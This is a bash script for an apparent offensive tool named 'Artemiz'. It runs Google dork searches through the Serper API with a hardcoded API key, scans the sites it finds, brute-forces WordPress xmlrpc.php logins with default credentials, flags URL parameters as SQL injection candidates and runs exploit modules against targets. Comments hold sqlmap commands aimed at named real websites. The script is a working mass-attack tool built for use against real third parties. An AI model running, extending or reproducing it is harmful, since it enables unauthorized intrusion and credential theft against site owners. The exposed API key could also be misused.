#!/bin/bash
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
NORM='\033[0;37m'

artemix_box="$NORM[${PURPLE}4RTEMIX${NORM}]"
artemix_arrow_green="${GREEN} ▶"
artemix_arrow_red="${RED} ▶"
ARTEMIZBOX_INFO="$NORM[${BLUE}INFO${NORM}]"
ARTEMIZBOX_MEDIUM="$NORM[${YELLOW}MEDIUM${NORM}]"
ARTEMIZBOX_CRITICAL="$NORM[${RED}CRITICAL${NORM}]"
ARTEMIZBOX_HIGH="$NORM[${RED}HIGH${NORM}]"


# cd /mnt/d/ex/artemiz/artemiz-dorker-india/
# firefox --screenshot google.com
#	depencies
# apt install lynx
# apt install python-is-python3
# apt  install firefox
# urlencode => apt install gridsite-clients

# catimg screenshot.png -w 100
function DORKER() {
echo -e "$artemix_arrow_green$BLUE DORK$NORM $DORKER_VALUE"
curl --location --silent --request POST 'https://google.serper.dev/search' \
--header 'X-API-KEY: 2cd2a9fb24b888929dec96a2f9f59a1f537d5f85' \
--header 'Content-Type: application/json' \
--data @<(cat <<EOF
{
  "q": "${DORKER_VALUE}",
  "location":"Indonesia",
  "gl":"id",
  "hl":"id",
  "page": "1",
  "num" : "200"
  }
EOF
) | jq | grep '"link": ' | grep -v "www.google.com" | awk '{print $2}' | sort -n | uniq > cache/domains.txt

echo "" > cache/extracted.txt
for domain in $(cat cache/domains.txt); do
	echo -e "$domain" | cut -d "/" -f1-3 | cut -d '"' -f2 >> cache/extracted.txt
done
cat -n cache/domains.txt
	echo -e "${GREEN} ▶$NORM All URL(s) saved into cache/domains.txt"
	echo -e "${GREEN} ▶$NORM All Domain(s) saved into cache/extracted.txt"
	echo -e "${GREEN} ▶ DORKER DONE!$NORM"
	read -p "PRESS ANY KEY TO CONTINUE"
}

# sqlmap -u 'http://manoharcloth.co.in/product-categories.php?sub_id=134' --batch
# sqlmap -u 'http://rbvrrwomenscollege.ac.in/admin.php' --data="user=admin&pass=admin123" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B

clear




function XMLRPC() {
	defUser=("admin" "wadminw" "wordpress")
	defPass=("admin" "pass" "admin123" "0192837465z")

	echo -ne "bruteforcing...\r"
	for user in ${defUser[@]}; do
	for pass in ${defPass[@]}; do

		if [[ $(curl --silent -X POST --max-time 5 -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$user</value></param><param><value>$pass</value></param></params></methodCall>" -ks "$site/xmlrpc.php" | grep "<name>isAdmin</name>") ]];
		then
				echo -e "$RED[$GREEN-$RED]$GREEN $(printf '%-20s| %-15s\n' "$user:$pass" $site)$NORM"
				echo -e "$site | $user:$pass VALID" >> success.txt
				echo ""
		else
				echo -ne "${YELLOW} ▶ 4RTEMIX XMLRPC BRUTEFORCE $NORM $user:$pass                        \r"
		fi
	done
	done
				echo -e "${RED} ▶ 4RTEMIX XMLRPC BRUTEFORCE: FAILED TO GET CREDENTIALS                  "
}

function SCANNER() {
for site in $(cat cache/extracted.txt); do
	DOMAIN=`echo "$site" | sed -e 's/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/'`
	echo ''
	echo -e "$artemix_box$BLUE SITE$NORM $site$NORM"
	echo -e "$artemix_box$BLUE INFORMATION$NORM"
	
	DOMAIN_FILE="domains/$DOMAIN"
	
	if [[ ! -f "$DOMAIN_FILE" ]];
	then
		echo '' > "$DOMAIN_FILE"
	fi
	echo -e "DATE:`date`" >> $DOMAIN_FILE
	echo -e "SITE:$DOMAIN" >> $DOMAIN_FILE

	echo -e "${GREEN} ▶$BLUE IP$NORM `dig -4 "$DOMAIN" +short | tail -1` $NORM"
	echo -e "IP:`dig -4 "$DOMAIN" +short | tail -1`" >> $DOMAIN_FILE
	
	#		Getting Headers Information
	information="cache/information.txt"

	curl -kIs --max-time 5 "$site" > $information

	[[ $(cat "$information" | grep "Server") ]] && echo -e "${GREEN} ▶$BLUE SERVER$NORM `cat $information | grep "Server"` $NORM" || echo -e "${GREEN} ▶$BLUE SERVER$NORM `cat $information | grep "server"` $NORM"
	echo -e "${GREEN} ▶$BLUE STATUS$NORM `cat $information | grep "HTTP/"` $NORM"
	[[ $(cat "$information" | grep "flare") ]] && echo -e "${RED} ▶$RED CLOUDFLARE detected!$NORM" || echo -e "${GREEN} ▶$BLUE CLOUDFLARE$NORM none$NORM"

	#		Checking Vulnaberity
	grab="cache/grab.txt"

	curl -ks --max-time 5 "$site" > $grab

	[[ $(cat "$grab" | grep "a href" | grep "wp-") ]] && echo -e "${GREEN} ▶ WORDPRESS DETECTED!$NORM" && XMLRPC || echo -e "${GREEN} ▶$BLUE WORDPRESS$NORM none$NORM"

	echo -e "${GREEN} ▶$BLUE LINK$NORM `cat "cache/domains.txt" | grep "$site" | head -1 | cut -d '"' -f2`$NORM"
	echo -e "LINK:`cat "cache/domains.txt" | grep "$site" | head -1 | cut -d '"' -f2`" >> $DOMAIN_FILE
	#lynx -dump "$grab" | grep "</a>" | grep "=" | grep ".php?" | head -n5
  cat "$grab" | grep -io '<a href=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^<a href=["'"'"']//i' -e 's/["'"'"']$//i' | grep -vE "youtube|facebook|twitter|youtu.be|google|whatsapp" > cache/sql_param.txt

  echo '' > cache/sql_param_url.txt
  cat "cache/sql_param.txt" | grep "?" | grep "=" | head -1 > cache/sql_param_url.txt

  if [[ ! -s "cache/sql_param_url.txt" ]];
  then
  #  echo -e "${GREEN} ▶$BLUE SQLi$NORM `cat cache/sql_param_url.txt`"
  # elif [[ $(cat "cache/sql_param_url.txt")=="" ]];
  # then
  	echo -e "${RED} ▶$RED SQLi NOT FOUND$NORM"
  else
  	if [[ $(cat "cache/sql_param_url.txt" | grep "$site") ]]; then
  		echo -e "${GREEN} ▶$BLUE SQLi$GREEN `cat cache/sql_param_url.txt` $NORM"
  		echo -e "SQL: `cat cache/sql_param_url.txt`" >> $DOMAIN_FILE
  	else
   		echo -e "${GREEN} ▶$BLUE SQLi$GREEN $site/`cat cache/sql_param_url.txt` $NORM"
   		echo -e "SQL: $site/`cat cache/sql_param_url.txt`" >> $DOMAIN_FILE
    fi
  fi

	echo ''
done
read -p "PRESS ANY KEY TO CONTINUE"
}

function EXPLOITS() {
WEBSITE="http://www.oburguer.com.br"
	echo -e "$artemix_arrow_green$BLUE LOAD MODULE$NORM /exploits/"
	for xploits in "exploits"/*.sh; do
		source $xploits
	done
}
function EXPLOITS_TAG() {
	second=`echo $options | awk '{print $2}'`

	WEBSITE=$select_domain_file
	DOMAIN_NAME=`echo -e "$WEBSITE" | sed -e 's/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/' | sed "s/www.//"`

	echo -e "$artemix_arrow_green$YELLOW LOADING TAG$RED $second$NORM from exploits folder."
	echo -e "$artemix_arrow_green$BLUE MODULES COUNT$NORM `grep -R "<<$second>>" exploits/* | awk '{print $1}' | cut -d ":" -f1 | wc -l`"

	CF="OFF"
	if [[ `curl -kIs "$WEBSITE" | grep "flare"` ]];
	then
		echo -e "$artemix_arrow_green$YELLOW CLOUDFLARE DETECTED$NORM"
		read -p $" [?] SET CF => ON (crawl target using an APIKEY)? [y/N]" cf_opt
		if [[ $cf_opt == "y" ]];
		then
			CF="ON"
		fi
	fi

	for xploits in `grep -R "<<$second>>" exploits/* | awk '{print $1}' | cut -d ":" -f1`; do
		#	//	echo $xploits
		export CF=$CF && export WEBSITE=$WEBSITE && export DOMAIN_NAME=$DOMAIN_NAME && $xploits
	done
}


function SETTING_DOMAIN() {
	second=`echo $options | awk '{print $2}'`
	set_value=`echo $options | awk '{print $3}'`
	[ $second == "domain" ] && select_domain_file="$set_value"; echo -e " $artemix_arrow_green$BLUE DOMAIN$NORM $set_value" || echo ""
}
function SETTING_DORK() {
	second=`echo $options | awk '{print $2}'`
	set_dork=`echo $options | cut -d "=" -f2`
	[ $second == "dork"* ] && echo -e "e.g: set dork=inurl:'admin/login.php' site:com";DORKER_VALUE="$set_dork"; echo -e " $artemix_arrow_green$BLUE DORK$NORM $set_dork" || echo ""

}

function ARTEMIZ_HELPER() {
	echo -e ""
	echo -e "  - help                                   Show this information"
	echo -e "  - runtag <module.name>/<module.tag>      Running modules with single target"
	echo -e "  - set domain <target>                    Setting the domain"
	echo -e "  - show options/options                   Show all options and values"
	echo -e ""
}
function LOGO() {
echo -e "$NORM
   ⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣄⣀⠀⠀⠀⠀⠀
⠀⠀   ⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
   ⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢿⣿⣷⡀⠀
   ⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣴⢿⣿⣧⠀    ┏┓        •     ┓    ┓       ┓     ┳┓┏┓┏┓
   ⣿⣿⣿⣿⣿⡿⠛⣩⠍⠀⠀⠀⠐⠉⢠⣿⣿⡇    ┣┫┏┓╋┏┓┏┳┓┓┓┏  ┏┫┏┓┏┓┃┏┏┓┏┓  ┣┓┓┏  ┣┫┃ ┃┃
   ⣿⡿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿    ┛┗┛ ┗┗ ┛┗┗┗┛┗  ┗┻┗┛┛ ┛┗┗ ┛   ┗┛┗┫  ┛┗┗┛┗╋
   ⢹⣿⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡏    Series IX                       ┛ $GREEN Version ${RED}↛${NORM} 4.0.0
   ⠀⠻⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⠟⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠟⠁⠀⠀⠀⠀⠀⠀⠀
"
}


function MENU() {
	echo -e "$NORM ▶ SELECT THE OPTIONS BELLOW:"
	echo ""
	echo -e "$PURPLE [${YELLOW}1$PURPLE]${YELLOW} Serpdev dorker     $PURPLE[${YELLOW}5$PURPLE]${YELLOW} Modules"
	echo -e "$PURPLE [${YELLOW}2$PURPLE]${YELLOW} Scan All List      $PURPLE[${YELLOW}6$PURPLE]${YELLOW} Commands"
	echo -e "$PURPLE [${YELLOW}3$PURPLE]${YELLOW} Exploit            $PURPLE[${YELLOW}h$PURPLE]${YELLOW} Tools Information [help]"
	echo -e "$PURPLE [${YELLOW}4$PURPLE]${YELLOW} Vulnaberity        $PURPLE[${YELLOW}r$PURPLE]${YELLOW} Refresh Tools"
	echo -e "$PURPLE [${YELLOW}5$PURPLE]${YELLOW} Show Domains       $PURPLE[${YELLOW}0$PURPLE]${YELLOW} Exit"


	echo -e "$NORM"
	# read -p $'SELECT > ' options
ctrl_c() {
	echo "corupted!"
	MENU
}
while IFS="" read -r -e -d $'\n' -p "-- Artemiz[s-ix/v4.0.0]>> " options; do
		history -s "$options"
		trap ctrl_c INT
	case "$options" in
	    "1")
	       echo -e "$artemix_box$BLUE RUNNING THE DORKER$NORM"
				DORKER
				clear
				LOGO
				MENU
				;;
	    "2")
		    SCANNER
		    clear
		    LOGO
		    MENU
				;;
			"help")
					ARTEMIZ_HELPER
				;;
			"show options" | "options")
					echo -e " $artemix_arrow_green$BLUE DOMAIN$NORM $select_domain_file"
					echo -e " $artemix_arrow_green$BLUE FILE$NORM   domains/$select_domain_file"
					echo -e " $artemix_arrow_green$BLUE DORK$NORM   $DORKER_VALUE"
				;;
			"set domain"*)
						SETTING_DOMAIN
				;;
			"set dork"*)
						SETTING_DORK
				;;
	    "show domains" | "5")
					echo ""> cache/db_domains.txt
					for entry in "domains"/*
					do
					  # echo -e "$entry" | cut -d "/" -f2
					  echo -e "$entry" | cut -d "/" -f2 >> cache/db_domains.txt
					done
					sed -i '/^$/d' cache/db_domains.txt
					echo -e "`cat -n cache/db_domains.txt`"
					read -p $">> SELECT THE OPTION:" select_domain
					[ $select_domain == "" ] || [ $select_domain == " " ] && echo "" || select_domain_file=`cat cache/db_domains.txt | head -n"$select_domain" | tail -1`; clear; echo -e "Reading file:${GREEN} $select_domain_file$NORM"; echo -e "`cat "domains/$select_domain_file"`"
				;;
				"r")
					bash artemiz.sh
				;;
				"run")
					EXPLOITS
				;;
				"runtag"*)
					EXPLOITS_TAG
				;;
	     "exit" | "0")
				kill -9 `ps aux | grep "bash artemiz.sh" | awk '{print $2}'`
				exit
				exit
			 ;;
	    *)
	        echo "Unknown command: $command" ;;
	esac
done
}
DORKER_VALUE="site:in inurl:/admin/login.php"
LOGO
MENU
